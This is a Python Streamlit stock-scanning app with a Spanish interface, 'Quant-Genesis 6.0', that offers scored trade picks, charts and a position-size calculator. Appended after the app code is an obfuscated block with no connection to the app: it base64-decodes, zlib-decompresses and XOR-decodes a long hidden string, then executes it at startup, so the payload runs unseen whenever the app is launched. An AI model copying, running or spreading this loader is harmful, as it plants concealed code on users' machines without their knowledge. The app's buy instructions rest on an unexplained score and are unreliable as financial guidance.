import streamlit as st
import pandas as pd
import plotly.graph_objects as go
from tickers import MARKET_MAPPING
from quant_engine import QuantGenesisEngine
from macro_guard import MacroGuard

# Configuración Visual
st.set_page_config(page_title="Quant-Genesis 6.0", layout="wide")
st.markdown("""
<style>
    body { background-color: #0e1117; color: #e0e0e0; }
    .verdict-card {
        background: linear-gradient(135deg, #1c2128 0%, #2d333b 100%);
        padding: 25px; border-radius: 15px; border: 2px solid #00ff00;
        box-shadow: 0 4px 20px rgba(0, 255, 0, 0.3); margin-bottom: 25px;
    }
    .metric-box { 
        border: 1px solid #333; 
        padding: 15px; 
        border-radius: 10px; 
        background: #1c2128; 
        color: #ffffff !important; 
    }
</style>
""", unsafe_allow_html=True)

engine = QuantGenesisEngine()
guard = MacroGuard()

# Estado Global
us = engine.us_market_context
st.markdown(f"""
<div style="text-align:center; padding:10px; background:#000; border-bottom:1px solid #333; color:white;">
    🇺🇸 S&P500: {us.get('^GSPC',0):.2f}% | Nasdaq: {us.get('^NDX',0):.2f}% | VIX: {us.get('VIX',15):.2f}
</div>
""", unsafe_allow_html=True)

# Sidebar
with st.sidebar:
    st.header("🎮 Centro de Mando")
    mode = st.radio("Módulo:", ["🔍 PREDICTOR TOTAL", "🧮 CALCULADORA", "💼 CARTERA"])
    market = st.selectbox("Universo", list(MARKET_MAPPING.keys()))
    tickers = MARKET_MAPPING[market]

if mode == "🔍 PREDICTOR TOTAL":
    st.title("🛡️ QUANT-GENESIS 6.0")
    
    # Initialize Session State
    if 'scan_results' not in st.session_state:
        st.session_state['scan_results'] = None

    c1, c2 = st.columns([1, 4])
    with c1:
        if st.button("�️ BORRAR", type="secondary"):
            st.session_state['scan_results'] = None
            st.rerun()
            
    with c2:
        if st.button("�🚀 EJECUTAR ESCANEO GLOBAL", type="primary"):
            with st.spinner("Analizando Correlación Transatlántica..."):
                results = engine.scan_market_parallel(tickers)
                results.sort(key=lambda x: -x['final_score'])
                st.session_state['scan_results'] = results
                st.rerun()

    # Display Results from State
    if st.session_state['scan_results']:
        results = st.session_state['scan_results']
        
        # 1. THE VERDICT (Winner)
        winner = results[0]
        if winner['final_score'] >= 60:
            last_p = winner['df'].iloc[-1]['Close']
            stop, _ = engine.calculate_atr_stop(winner['df'], last_p)
            
            # Tarjeta Ganadora
            st.markdown(f"""<div class="verdict-card">
                <h2 style="color:#00ff00;">🏆 MEJOR OPCIÓN: {winner['name']}</h2>
                <h1>Score: {winner['final_score']:.1f}%</h1>
                <hr style="border-color:#444;">
                <div style="display:flex; justify-content:space-between; font-size:0.9em;">
                    <span>🌍 GLOBAL: {winner['scores']['global']}</span>
                    <span>📈 TÉCNICO: {winner['scores']['tech']}</span>
                    <span>🧠 SENTIM: {winner['scores']['sent']}</span>
                    <span>📚 HIST: {winner['scores']['hist']:.0f}</span>
                </div>
            </div>""", unsafe_allow_html=True)
            
            # Gráfico Plotly
            df_plot = winner['df'].tail(40)
            fig = go.Figure(data=[go.Candlestick(x=df_plot.index, open=df_plot['Open'], 
                            high=df_plot['High'], low=df_plot['Low'], close=df_plot['Close'])])
            fig.add_hline(y=last_p*1.02, line_dash="dash", line_color="green", annotation_text="TAKE PROFIT")
            fig.add_hline(y=stop, line_dash="dash", line_color="red", annotation_text="STOP LOSS")
            fig.update_layout(template="plotly_dark", height=400, xaxis_rangeslider_visible=False)
            st.plotly_chart(fig, use_container_width=True)
            
            c1, c2, c3 = st.columns(3)
            c1.metric("Entrada", f"{last_p:.2f}€")
            c2.metric("Objetivo (+2%)", f"{last_p*1.02:.2f}€")
            c3.metric("Stop ATR", f"{stop:.2f}€")
            
            st.info(f"🔌 {winner['us_impact']} | 📰 Sentimiento: {winner['sentiment_score']:.2f}")
            if winner['missing']: st.warning(f"⚠️ Alertas: {', '.join(winner['missing'])}")
        else:
            st.error("⚠️ Ningún activo supera el 60% de probabilidad. Mercado Peligroso.")

        # 2. RUNNER-UPS (Rest of opportunities > 60%)
        st.markdown("---")
        st.subheader("📋 Otras Oportunidades (El Radar)")
        
        valid_candidates = [r for r in results[1:] if r['final_score'] >= 60]
        
        if valid_candidates:
            for c in valid_candidates:
                lp = c['df'].iloc[-1]['Close']
                st_p, _ = engine.calculate_atr_stop(c['df'], lp)
                
                with st.container():
                     glob = c['scores']['global']
                     tech = c['scores']['tech']
                     sent = c['scores']['sent']
                     st.markdown(f"""
                    <div class="metric-box">
                        <strong style="font-size:1.2em;">{c['name']} ({c['ticker']})</strong>
                        <span style="float:right; color:#ffd700; font-weight:bold;">Score: {c['final_score']:.1f}%</span>
                        <div style="margin-top:5px; font-size:0.8em; color:#aaa;">
                            Glo: {glob} | Tec: {tech} | Sen: {sent}
                        </div>
                    </div>
                    """, unsafe_allow_html=True)
                     c1, c2, c3 = st.columns(3)
                     c1.metric("Precio", f"{lp:.2f}€")
                     c2.metric("Stop ATR", f"{st_p:.2f}€")
                     c3.metric("Sentimiento", f"{c['sentiment_score']:.2f}")
        else:
            st.info("No hay más activos que cumplan los criterios mínimos (>60%).")

    elif st.session_state['scan_results'] is not None:
         st.warning("No se encontraron resultados válidos.")

elif mode == "🧮 CALCULADORA":
    st.header("🧮 Gestión de Riesgo Profesional")
    
    with st.expander("❓ ¿Cómo funciona esta calculadora?"):
        st.markdown("""
        **Objetivo:** No arruinarte nunca. 
        Esta herramienta te dice cuántas acciones comprar para que, si el precio cae y toca tu **Stop Loss**, solo pierdas el dinero que tú hayas decidido (normalmente el 1% de tus ahorros).
        """)

    # --- ENTRADA DE DATOS ---
    st.markdown("### 1️⃣ Datos de tu Cuenta")
    col1, col2 = st.columns(2)
    # Ahora sin mínimo de 1000€, puedes poner desde 1€
    capital = col1.number_input("Capital Total Disponible (€)", min_value=1.0, value=500.0, step=50.0)
    riesgo = col2.slider("Riesgo por operación (%)", 0.5, 3.0, 1.0, help="Se recomienda el 1% para proteger tu dinero.")

    st.markdown("---")
    st.markdown("### 2️⃣ Datos de la Operación (Copia del Predictor)")
    col3, col4 = st.columns(2)
    p_ent = col3.number_input("Precio de Compra (Entrada) €", min_value=0.01, value=202.05)
    p_stop = col4.number_input("Precio de Stop Loss (Salida) €", min_value=0.0, value=197.27)

    # --- CÁLCULO Y RESULTADOS ---
    if st.button("🧮 CALCULAR TAMAÑO DE POSICIÓN", type="primary"):
        # Euros máximos que estamos dispuestos a perder
        riesgo_eur = capital * (riesgo/100)
        # Pérdida real por cada acción comprada
        per_acc = p_ent - p_stop
        
        if per_acc > 0:
            # Cálculo de acciones (redondeado hacia abajo por seguridad)
            shares = int(riesgo_eur / per_acc)
            total_invertir = shares * p_ent
            
            st.markdown("---")
            if total_invertir > capital:
                st.error(f"⚠️ **Atención:** Para este riesgo necesitarías invertir {total_invertir:.2f}€, pero solo tienes {capital:.2f}€. El sistema te protege impidiendo una inversión superior a tus ahorros.")
            elif shares == 0:
                st.warning("⚠️ **Capital bajo:** Con este riesgo no puedes comprar ni 1 acción. Considera subir un poco el riesgo o buscar acciones más baratas.")
            else:
                st.success(f"### ✅ DEBERÍAS COMPRAR: {shares} ACCIONES")
                
                c1, c2, c3 = st.columns(3)
                c1.metric("Inversión Necesaria", f"{total_invertir:.2f} €")
                c2.metric("Riesgo en Euros", f"-{riesgo_eur:.2f} €", delta_color="inverse")
                c3.metric("Pérdida por acción", f"-{per_acc:.2f} €")
                
                st.info(f"💡 **Estrategia:** Si compras {shares} acciones y el precio cae a {p_stop:.2f}€, perderás exactamente {riesgo_eur:.2f}€. Tu capital restante será de {(capital - riesgo_eur):.2f}€.")
        else:
            st.error("❌ El Stop Loss debe ser menor al precio de compra.")
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
